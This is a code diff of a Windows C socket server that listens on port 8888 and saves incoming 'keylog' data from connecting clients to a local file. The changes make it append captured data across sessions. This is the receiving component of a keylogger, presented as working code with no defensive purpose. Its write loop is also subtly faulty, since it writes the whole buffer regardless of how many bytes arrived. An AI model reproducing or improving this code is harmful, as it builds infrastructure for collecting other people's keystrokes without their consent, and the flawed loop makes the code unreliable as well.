@@ -5,7 +5,7 @@
 #include <string.h>
 #include <Windows.h>
 
-#define BUF_SIZE 30
+#define BUF_SIZE 10
 #define DEF_PORT 8888
 #define DEF_FILE_NAME "dat.txt"
 void error_handling(const char* message);
@@ -37,11 +37,10 @@ int main() {
 	if (listen(hservSock, 1) == SOCKET_ERROR)
 		error_handling("[-] Error: listen() fail");
 
-	int count = 1;
+	int count = 0;
 
 	while (1) {
-		if (count)
-			printf("[*] Waiting Client\n");
+		printf("[*] Waiting Client\n");
 		clntAddr_len = sizeof(clntAddr);
 
 		hclntSock = accept(hservSock, (SOCKADDR*)&clntAddr, &clntAddr_len);
@@ -51,14 +50,17 @@ int main() {
 		printf("[+] Connected client\n");
 
 		FILE *fp = NULL;
-		fp = fopen(DEF_FILE_NAME, "wb");
+		fp = fopen(DEF_FILE_NAME, "ab");
 
 		if (fp == NULL)
 			error_handling("[-] Error : fopen() fail");
+		
 		printf("[+] Reciving data of keylog...\n");
-		while ((recv_len = recv(hclntSock, buf, BUF_SIZE, 0)) != 0) {
+		
+		while ((recv_len = recv(hclntSock, buf, BUF_SIZE, 0)) != 0) 
 			fwrite(buf, BUF_SIZE, 1, fp);
-		}
+		
+
 		fclose(fp);
 
 		printf("[+] Finish reciving data\n\n");
